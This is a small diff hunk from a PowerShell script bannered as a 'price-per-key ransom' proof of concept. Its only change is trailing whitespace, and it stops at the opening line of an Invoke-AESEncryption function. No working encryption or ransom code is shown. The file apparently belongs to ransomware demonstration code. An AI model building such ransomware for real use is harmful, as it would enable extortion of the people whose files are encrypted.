@@ -1,7 +1,7 @@
 #################################
 ####     PROOF OF CONCEPT    ####
 ####   PRICE-PER-KEY RANSOM  ####
-#################################
+#################################  
 
 function Invoke-AESEncryption {
     [CmdletBinding()]
